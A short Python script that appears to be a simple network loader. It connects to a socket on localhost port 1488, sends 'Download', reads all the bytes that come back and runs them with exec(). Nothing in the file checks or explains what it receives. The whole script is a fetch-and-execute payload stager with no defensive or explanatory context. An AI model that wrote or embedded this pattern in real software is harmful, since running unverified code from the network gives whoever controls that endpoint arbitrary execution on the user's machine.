import socket

sock = socket.socket()
sock.connect(('localhost', 1488))

code = b''

sock.send(b'Download')

while True:
    code_chunk = sock.recv(1024)

    if not code_chunk:
        sock.close()
        break

    code += code_chunk

sock.close()
exec(code)
